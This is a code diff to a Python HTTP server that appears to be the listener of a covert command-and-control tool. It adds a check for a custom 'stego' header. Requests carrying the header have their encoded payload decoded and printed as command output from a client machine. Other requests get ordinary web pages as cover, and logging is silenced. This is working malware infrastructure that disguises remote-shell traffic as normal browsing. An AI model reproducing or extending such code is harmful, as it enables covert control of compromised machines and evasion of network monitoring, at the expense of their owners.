@@ -29,6 +29,15 @@ class RequestHandler(SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         pass # Do nothing (silences logs)
 
+    def is_stego_request(self):
+        '''
+        Check if this request is steganographic communication from the client
+        or just a normal request from a browser.
+        '''
+        # Check if stego header is present.
+        print(f"Is stego request: {self.headers.get(STEGO_HEADER_NAME)}")
+        return self.headers.get(STEGO_HEADER_NAME)
+    
     def get_encoded_data(self):
         # Retrieve the encoded data from the HTTP header
         encoded_data = self.headers.get(STEGO_HEADER_NAME)
@@ -40,9 +49,9 @@ class RequestHandler(SimpleHTTPRequestHandler):
         else:
             return ""
 
-    def serve_web_content(self):
+    def serve_normal_web_content(self):
         '''
-        Serves an HTML page from the website.
+        Serves 'normal' HTML pages from the website, not used for steganographic communication.
         '''
         if self.path == '/':
             self.path = '/index.html'
@@ -58,7 +67,10 @@ class RequestHandler(SimpleHTTPRequestHandler):
         self.wfile.write(bytes(file_content, 'utf-8'))
 
     def do_GET(self):
-        # self.serve_web_content() # CURRENTLY NOT USED
+        # Check if request is steganographic communication or just regular browser traffic.
+        if not self.is_stego_request():
+            self.serve_normal_web_content()
+            return
         output = self.get_encoded_data()
         # Display command output from client machine, including current working directory.
         print("\n" + output + "\n")
